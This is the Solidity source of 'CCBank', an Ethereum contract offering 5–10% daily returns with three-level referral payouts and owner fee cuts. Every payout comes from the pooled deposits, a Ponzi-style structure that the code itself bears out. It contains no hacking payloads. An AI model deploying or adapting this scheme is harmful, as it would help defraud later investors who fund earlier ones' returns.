1 pragma solidity ^0.4.25;
2 
3 library SafeMath {
4     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
5         if (a == 0) {
6             return 0;
7         }
8         uint256 c = a * b;
9         assert(c / a == b);
10         return c;
11     }
12 
13     function div(uint256 a, uint256 b) internal pure returns (uint256) {
14         // assert(b > 0); // Solidity automatically throws when dividing by 0
15         uint256 c = a / b;
16         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
17         return c;
18     }
19 
20     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
21         assert(b <= a);
22         return a - b;
23     }
24 
25     function add(uint256 a, uint256 b) internal pure returns (uint256) {
26         uint256 c = a + b;
27         assert(c >= a);
28         return c;
29     }
30 }
31 
32 library Objects {
33     struct Investment {
34         uint256 planId;
35         uint256 investmentDate;
36         uint256 investment;
37         uint256 lastWithdrawalDate;
38         uint256 currentDividends;
39         bool isExpired;
40         bool isReInvest;
41     }
42 
43     struct Plan {
44         uint256 dailyInterest;
45         uint256 term; //0 means unlimited
46         uint256 limit; //0 means unlimited
47         uint256 perInvestorLimit;
48         uint256 leftAmount;
49         uint256 lastUpdateDate;
50     }
51 
52     struct Investor {
53         address addr;
54         uint256 referrerEarnings;
55         uint256 availableReferrerEarnings;
56         uint256 referrer;
57         uint256 planCount;
58         mapping(uint256 => Investment) plans;
59         uint256 level1RefCount;
60         uint256 level2RefCount;
61         uint256 level3RefCount;
62     }
63 }
64 
65 contract Ownable {
66     address public owner;
67 
68     event onOwnershipTransferred(address indexed previousOwner, address indexed newOwner);
69 
70     /**
71      * @dev The Ownable constructor sets the original `owner` of the contract to the sender
72      * account.
73      */
74     constructor() public {
75         owner = msg.sender;
76     }
77 
78     /**
79      * @dev Throws if called by any account other than the owner.
80      */
81     modifier onlyOwner() {
82         require(msg.sender == owner);
83         _;
84     }
85 
86     /**
87      * @dev Allows the current owner to transfer control of the contract to a newOwner.
88      * @param _newOwner The address to transfer ownership to.
89      */
90     function transferOwnership(address _newOwner) public onlyOwner {
91         require(_newOwner != address(0));
92         emit onOwnershipTransferred(owner, _newOwner);
93         owner = _newOwner;
94     }
95 }
96 
97 contract CCBank is Ownable {
98     using SafeMath for uint256;
99     uint256 public constant DEVELOPER_RATE = 30; //per thousand
100     uint256 public constant MARKETING_RATE = 70;
101     uint256 public constant REFERENCE_RATE = 80;
102     uint256 public constant REFERENCE_LEVEL1_RATE = 50;
103     uint256 public constant REFERENCE_LEVEL2_RATE = 20;
104     uint256 public constant REFERENCE_LEVEL3_RATE = 10;
105     // uint256 public constant REFERENCE_SELF_RATE = 5;
106     uint256 public constant MINIMUM = 0.01 ether; // 0.01eth, minimum investment needed
107     uint256 public constant REFERRER_CODE = 3466; //default
108 
109     uint256 public latestReferrerCode;
110     uint256 private totalInvestments_;
111 
112     address private developerAccount_;
113     address private marketingAccount_;
114     address private referenceAccount_;
115 
116     mapping(address => uint256) public address2UID;
117     mapping(uint256 => Objects.Investor) public uid2Investor;
118     Objects.Plan[] private investmentPlans_;
119 
120     event onInvest(address investor, uint256 amount);
121     event onReinvest(address investor, uint256 amount);
122     event onGrant(address grantor, address beneficiary, uint256 amount);
123     event onWithdraw(address investor, uint256 amount);
124 
125     /**
126      * @dev Constructor Sets the original roles of the contract
127      */
128 
129     constructor() public {
130         developerAccount_ = msg.sender;
131         marketingAccount_ = msg.sender;
132         referenceAccount_ = msg.sender;
133         _init();
134     }
135 
136     function() external payable {
137         if (msg.value == 0) {
138             withdraw();
139         } else {
140             invest(0, 0); //default to buy plan 0, no referrer
141         }
142     }
143 
144     function checkIn() public {
145     }
146 
147     function setMarketingAccount(address _newMarketingAccount) public onlyOwner {
148         require(_newMarketingAccount != address(0));
149         marketingAccount_ = _newMarketingAccount;
150     }
151 
152     function getMarketingAccount() public view onlyOwner returns (address) {
153         return marketingAccount_;
154     }
155 
156     function setDeveloperAccount(address _newDeveloperAccount) public onlyOwner {
157         require(_newDeveloperAccount != address(0));
158         developerAccount_ = _newDeveloperAccount;
159     }
160 
161     function getDeveloperAccount() public view onlyOwner returns (address) {
162         return developerAccount_;
163     }
164 
165     function setReferenceAccount(address _newReferenceAccount) public onlyOwner {
166         require(_newReferenceAccount != address(0));
167         referenceAccount_ = _newReferenceAccount;
168     }
169 
170     function setPlanLimit(uint256 _planId, uint256 _perInvestorLimit, uint256 _addAmount) public onlyOwner {
171         require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong investment plan id");
172         Objects.Plan storage plan = investmentPlans_[_planId];
173         plan.perInvestorLimit = _perInvestorLimit;
174         plan.leftAmount = plan.leftAmount.add(_addAmount);
175         plan.lastUpdateDate = block.timestamp;
176     }
177 
178     function getReferenceAccount() public view onlyOwner returns (address) {
179         return referenceAccount_;
180     }
181 
182     function _init() private {
183         latestReferrerCode = REFERRER_CODE;
184         address2UID[msg.sender] = latestReferrerCode;
185         uid2Investor[latestReferrerCode].addr = msg.sender;
186         uid2Investor[latestReferrerCode].referrer = 0;
187         uid2Investor[latestReferrerCode].planCount = 0;
188         investmentPlans_.push(Objects.Plan( 50,           0, 0,          0,              0, block.timestamp)); // 5%, unlimited
189         investmentPlans_.push(Objects.Plan( 60, 45*60*60*24, 0,          0,              0, block.timestamp)); // 6%, 45 days
190         investmentPlans_.push(Objects.Plan( 70, 25*60*60*24, 0,          0,              0, block.timestamp)); // 7%, 25 days
191         investmentPlans_.push(Objects.Plan( 80, 18*60*60*24, 0,          0,              0, block.timestamp)); // 8%, 18 days
192         investmentPlans_.push(Objects.Plan(100,           0, 1, 1 ether, 2000 ether, block.timestamp)); //10%, unlimited, 1 eth, 2000 eth
193     }
194 
195     function getCurrentPlans() public view returns (uint256[] memory,
196         uint256[] memory,
197         uint256[] memory,
198         uint256[] memory,
199         uint256[] memory,
200         uint256[] memory) {
201         uint256[] memory ids               = new uint256[](investmentPlans_.length);
202         uint256[] memory interests         = new uint256[](investmentPlans_.length);
203         uint256[] memory terms             = new uint256[](investmentPlans_.length);
204         uint256[] memory limits            = new uint256[](investmentPlans_.length);
205         uint256[] memory perInvestorLimits = new uint256[](investmentPlans_.length);
206         uint256[] memory leftAmounts       = new uint256[](investmentPlans_.length);
207         for (uint256 i = 0; i < investmentPlans_.length; i++) {
208             Objects.Plan storage plan = investmentPlans_[i];
209             ids[i] = i;
210             interests[i] = plan.dailyInterest;
211             terms[i] = plan.term;
212             limits[i] = plan.limit;
213             perInvestorLimits[i] = plan.perInvestorLimit;
214             leftAmounts[i] = plan.leftAmount;
215         }
216         return
217         (
218         ids,
219         interests,
220         terms,
221         limits,
222         perInvestorLimits,
223         leftAmounts
224         );
225     }
226 
227     function addNewPlan(uint256 dailyInterest, uint256 term, uint256 limit, uint256 perInvestorLimit, uint256 leftAmount) public onlyOwner {
228         investmentPlans_.push(Objects.Plan(dailyInterest,  term, limit, perInvestorLimit, leftAmount, block.timestamp));
229     }
230 
231     function getTotalInvestments() public onlyOwner view returns (uint256){
232         return totalInvestments_;
233     }
234 
235     function getBalance() public view returns (uint256) {
236         return address(this).balance;
237     }
238 
239     function getUIDByAddress(address _addr) public view returns (uint256) {
240         return address2UID[_addr];
241     }
242 
243     function getInvestorInfoByUID(uint256 _uid) public view returns (uint256, uint256, uint256, uint256, uint256, uint256, uint256, uint256[] memory, uint256[] memory) {
244         if (msg.sender != owner) {
245             require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
246         }
247         Objects.Investor storage investor = uid2Investor[_uid];
248         uint256[] memory newDividends = new uint256[](investor.planCount);
249         uint256[] memory currentDividends = new  uint256[](investor.planCount);
250         for (uint256 i = 0; i < investor.planCount; i++) {
251             require(investor.plans[i].investmentDate != 0, "wrong investment date");
252             currentDividends[i] = investor.plans[i].currentDividends;
253             if (investor.plans[i].isExpired) {
254                 newDividends[i] = 0;
255             } else {
256                 if (investmentPlans_[investor.plans[i].planId].term > 0) {
257                     if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
258                         newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate);
259                     } else {
260                         newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
261                     }
262                 } else {
263                     newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate);
264                 }
265             }
266         }
267         return
268         (
269         investor.referrerEarnings,
270         investor.availableReferrerEarnings,
271         investor.referrer,
272         investor.level1RefCount,
273         investor.level2RefCount,
274         investor.level3RefCount,
275         investor.planCount,
276         currentDividends,
277         newDividends
278         );
279     }
280 
281     function getInvestorPlanLimitsByUID(uint256 _uid, uint256 _planId) public view returns (uint256, uint256, uint256) {
282         if (msg.sender != owner) {
283             require(address2UID[msg.sender] == _uid, "only owner or self can check the investor info.");
284         }
285         require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong investment plan id");
286 
287         Objects.Investor storage investor = uid2Investor[_uid];
288         Objects.Plan storage plan = investmentPlans_[_planId];
289         uint256 totalInvestment = 0;
290         uint256 leftInvestmentLimit = 0;
291         if (plan.limit != 0) {
292             for (uint256 i = 0; i < investor.planCount; i++) {
293                 require(investor.plans[i].investmentDate != 0, "wrong investment date");
294                 if (investor.plans[i].planId != _planId || investor.plans[i].investmentDate < plan.lastUpdateDate) {
295                     continue;
296                 }
297                 totalInvestment = totalInvestment.add(investor.plans[i].investment);
298             }
299             leftInvestmentLimit = (totalInvestment > plan.perInvestorLimit) ? 0 : plan.perInvestorLimit.sub(totalInvestment);
300         }
301 
302         return
303         (
304         plan.limit,
305         plan.leftAmount,
306         leftInvestmentLimit
307         );
308     }
309 
310     function getInvestmentPlanByUID(uint256 _uid) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, bool[] memory) {
311         if (msg.sender != owner) {
312             require(address2UID[msg.sender] == _uid, "only owner or self can check the investment plan info.");
313         }
314         Objects.Investor storage investor = uid2Investor[_uid];
315         uint256[] memory planIds = new  uint256[](investor.planCount);
316         uint256[] memory investmentDates = new  uint256[](investor.planCount);
317         uint256[] memory investments = new  uint256[](investor.planCount);
318         uint256[] memory currentDividends = new  uint256[](investor.planCount);
319         bool[] memory isExpireds = new  bool[](investor.planCount);
320 
321         for (uint256 i = 0; i < investor.planCount; i++) {
322             require(investor.plans[i].investmentDate != 0, "wrong investment date");
323             planIds[i] = investor.plans[i].planId;
324             currentDividends[i] = investor.plans[i].currentDividends;
325             investmentDates[i] = investor.plans[i].investmentDate;
326             investments[i] = investor.plans[i].investment;
327             if (investor.plans[i].isExpired) {
328                 isExpireds[i] = true;
329             } else {
330                 isExpireds[i] = false;
331                 if (investmentPlans_[investor.plans[i].planId].term > 0) {
332                     if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
333                         isExpireds[i] = true;
334                     }
335                 }
336             }
337         }
338 
339         return
340         (
341         planIds,
342         investmentDates,
343         investments,
344         currentDividends,
345         isExpireds
346         );
347     }
348 
349     function _addInvestor(address _addr, uint256 _referrerCode) private returns (uint256) {
350         if (_referrerCode >= REFERRER_CODE) {
351             //require(uid2Investor[_referrerCode].addr != address(0), "Wrong referrer code");
352             if (uid2Investor[_referrerCode].addr == address(0)) {
353                 _referrerCode = 0;
354             }
355         } else {
356             _referrerCode = 0;
357         }
358         address addr = _addr;
359         latestReferrerCode = latestReferrerCode.add(1);
360         address2UID[addr] = latestReferrerCode;
361         uid2Investor[latestReferrerCode].addr = addr;
362         uid2Investor[latestReferrerCode].referrer = _referrerCode;
363         uid2Investor[latestReferrerCode].planCount = 0;
364         if (_referrerCode >= REFERRER_CODE) {
365             uint256 _ref1 = _referrerCode;
366             uint256 _ref2 = uid2Investor[_ref1].referrer;
367             uint256 _ref3 = uid2Investor[_ref2].referrer;
368             uid2Investor[_ref1].level1RefCount = uid2Investor[_ref1].level1RefCount.add(1);
369             if (_ref2 >= REFERRER_CODE) {
370                 uid2Investor[_ref2].level2RefCount = uid2Investor[_ref2].level2RefCount.add(1);
371             }
372             if (_ref3 >= REFERRER_CODE) {
373                 uid2Investor[_ref3].level3RefCount = uid2Investor[_ref3].level3RefCount.add(1);
374             }
375         }
376         return (latestReferrerCode);
377     }
378 
379     function _invest(address _addr, uint256 _planId, uint256 _referrerCode, uint256 _amount, bool isReInvest) private returns (bool) {
380         require(_planId >= 0 && _planId < investmentPlans_.length, "Wrong investment plan id");
381         require(_amount >= MINIMUM, "Less than the minimum amount of deposit requirement");
382 
383         uint256 uid = address2UID[_addr];
384         if (uid == 0) {
385             uid = _addInvestor(_addr, _referrerCode);
386             //new user
387         } else {//old user
388             //do nothing, referrer is permenant
389         }
390 
391         _checkLimit(uid, _planId, _amount);
392 
393         uint256 planCount = uid2Investor[uid].planCount;
394         Objects.Investor storage investor = uid2Investor[uid];
395         investor.plans[planCount].planId = _planId;
396         investor.plans[planCount].investmentDate = block.timestamp;
397         investor.plans[planCount].lastWithdrawalDate = block.timestamp;
398         investor.plans[planCount].investment = _amount;
399         investor.plans[planCount].currentDividends = 0;
400         investor.plans[planCount].isExpired = false;
401         investor.plans[planCount].isReInvest = isReInvest;
402 
403         investor.planCount = investor.planCount.add(1);
404 
405         _calculateReferrerReward(uid, _amount, investor.referrer);
406 
407         totalInvestments_ = totalInvestments_.add(_amount);
408 
409         uint256 developerPercentage = (_amount.mul(DEVELOPER_RATE)).div(1000);
410         developerAccount_.transfer(developerPercentage);
411         uint256 marketingPercentage = (_amount.mul(MARKETING_RATE)).div(1000);
412         marketingAccount_.transfer(marketingPercentage);
413         return true;
414     }
415 
416     function _checkLimit(uint256 _uid, uint256 _planId, uint256 _amount) private {
417         Objects.Plan storage plan = investmentPlans_[_planId];
418         if (plan.limit > 0) {
419             require(plan.leftAmount >= _amount && plan.perInvestorLimit >= _amount, "1 - Not enough limit");
420 
421             Objects.Investor storage investor = uid2Investor[_uid];
422             uint256 totalInvestment = 0;
423             uint256 leftInvestmentLimit = 0;
424             for (uint256 i = 0; i < investor.planCount; i++) {
425                 require(investor.plans[i].investmentDate != 0, "wrong investment date");
426                 if (investor.plans[i].planId != _planId || investor.plans[i].investmentDate < plan.lastUpdateDate) {
427                     continue;
428                 }
429                 totalInvestment = totalInvestment.add(investor.plans[i].investment);
430 
431             }
432             leftInvestmentLimit = (totalInvestment > plan.perInvestorLimit) ? 0 : plan.perInvestorLimit.sub(totalInvestment);
433 
434             require(leftInvestmentLimit >= _amount, "2 - Not enough limit");
435 
436             plan.leftAmount = plan.leftAmount.sub(_amount);
437         }
438 
439 
440     }
441 
442     function grant(address addr, uint256 _planId) public payable {
443         uint256 grantorUid = address2UID[msg.sender];
444         bool isAutoAddReferrer = true;
445         uint256 referrerCode = 0;
446 
447         if (grantorUid != 0 && isAutoAddReferrer) {
448             referrerCode = grantorUid;
449         }
450 
451         if (_invest(addr,_planId,referrerCode,msg.value, false)) {
452             emit onGrant(msg.sender, addr, msg.value);
453         }
454     }
455 
456     function invest(uint256 _referrerCode, uint256 _planId) public payable {
457         if (_invest(msg.sender, _planId, _referrerCode, msg.value, false)) {
458             emit onInvest(msg.sender, msg.value);
459         }
460     }
461 
462     function reinvest(uint256 _referrerCode, uint256 _planId) public payable {
463         require(msg.value == 0, "Reinvest doesn't allow to transfer trx simultaneously");
464         uint256 uid = address2UID[msg.sender];
465         require(uid != 0, "Can not reinvest because no any investments");
466         uint256 availableInvestAmount = 0;
467         for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
468             if (uid2Investor[uid].plans[i].isExpired) {
469                 continue;
470             }
471 
472             Objects.Plan storage plan = investmentPlans_[uid2Investor[uid].plans[i].planId];
473 
474             bool isExpired = false;
475             uint256 withdrawalDate = block.timestamp;
476             if (plan.term > 0) {
477                 uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(plan.term);
478                 if (withdrawalDate >= endTime) {
479                     withdrawalDate = endTime;
480                     isExpired = true;
481                 }
482             }
483 
484             uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , plan.dailyInterest , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate);
485 
486             availableInvestAmount = availableInvestAmount.add(amount);
487 
488             uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
489             uid2Investor[uid].plans[i].isExpired = isExpired;
490             uid2Investor[uid].plans[i].currentDividends =  uid2Investor[uid].plans[i].currentDividends.add(amount);
491         }
492 
493         if (uid2Investor[uid].availableReferrerEarnings>0) {
494             availableInvestAmount = availableInvestAmount.add(uid2Investor[uid].availableReferrerEarnings);
495             uid2Investor[uid].referrerEarnings = uid2Investor[uid].availableReferrerEarnings.add(uid2Investor[uid].referrerEarnings);
496             uid2Investor[uid].availableReferrerEarnings = 0;
497         }
498 
499         if (_invest(msg.sender, _planId, _referrerCode, availableInvestAmount, true)) {
500             emit onReinvest(msg.sender, availableInvestAmount);
501         }
502     }
503 
504     function withdraw() public payable {
505         require(msg.value == 0, "withdrawal doesn't allow to transfer trx simultaneously");
506         uint256 uid = address2UID[msg.sender];
507         require(uid != 0, "Can not withdraw because no any investments");
508         uint256 withdrawalAmount = 0;
509         for (uint256 i = 0; i < uid2Investor[uid].planCount; i++) {
510             if (uid2Investor[uid].plans[i].isExpired) {
511                 continue;
512             }
513 
514             Objects.Plan storage plan = investmentPlans_[uid2Investor[uid].plans[i].planId];
515 
516             bool isExpired = false;
517             uint256 withdrawalDate = block.timestamp;
518             if (plan.term > 0) {
519                 uint256 endTime = uid2Investor[uid].plans[i].investmentDate.add(plan.term);
520                 if (withdrawalDate >= endTime) {
521                     withdrawalDate = endTime;
522                     isExpired = true;
523                 }
524             }
525 
526             uint256 amount = _calculateDividends(uid2Investor[uid].plans[i].investment , plan.dailyInterest , withdrawalDate , uid2Investor[uid].plans[i].lastWithdrawalDate);
527 
528             withdrawalAmount = withdrawalAmount.add(amount);
529             msg.sender.transfer(amount);
530 
531             uid2Investor[uid].plans[i].lastWithdrawalDate = withdrawalDate;
532             uid2Investor[uid].plans[i].isExpired = isExpired;
533             uid2Investor[uid].plans[i].currentDividends += amount;
534         }
535 
536         if (uid2Investor[uid].availableReferrerEarnings>0) {
537             msg.sender.transfer(uid2Investor[uid].availableReferrerEarnings);
538             uid2Investor[uid].referrerEarnings = uid2Investor[uid].availableReferrerEarnings.add(uid2Investor[uid].referrerEarnings);
539             uid2Investor[uid].availableReferrerEarnings = 0;
540         }
541 
542         emit onWithdraw(msg.sender, withdrawalAmount);
543     }
544 
545     function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start) private pure returns (uint256) {
546         return (_amount * _dailyInterestRate / 1000 * (_now - _start)) / (60*60*24);
547     }
548 
549     function _calculateReferrerReward(uint256 _uid, uint256 _investment, uint256 _referrerCode) private {
550 
551         uint256 _allReferrerAmount = (_investment.mul(REFERENCE_RATE)).div(1000);
552         if (_referrerCode != 0) {
553             uint256 _ref1 = _referrerCode;
554             uint256 _ref2 = uid2Investor[_ref1].referrer;
555             uint256 _ref3 = uid2Investor[_ref2].referrer;
556             uint256 _refAmount = 0;
557 
558             if (_ref1 != 0) {
559                 _refAmount = (_investment.mul(REFERENCE_LEVEL1_RATE)).div(1000);
560                 _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
561                 uid2Investor[_ref1].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref1].availableReferrerEarnings);
562                 // _refAmount = (_investment.mul(REFERENCE_SELF_RATE)).div(1000);
563                 // uid2Investor[_uid].availableReferrerEarnings =  _refAmount.add(uid2Investor[_uid].availableReferrerEarnings);
564             }
565 
566             if (_ref2 != 0) {
567                 _refAmount = (_investment.mul(REFERENCE_LEVEL2_RATE)).div(1000);
568                 _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
569                 uid2Investor[_ref2].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref2].availableReferrerEarnings);
570             }
571 
572             if (_ref3 != 0) {
573                 _refAmount = (_investment.mul(REFERENCE_LEVEL3_RATE)).div(1000);
574                 _allReferrerAmount = _allReferrerAmount.sub(_refAmount);
575                 uid2Investor[_ref3].availableReferrerEarnings = _refAmount.add(uid2Investor[_ref3].availableReferrerEarnings);
576             }
577         }
578 
579         if (_allReferrerAmount > 0) {
580             referenceAccount_.transfer(_allReferrerAmount);
581         }
582     }
583 
584 }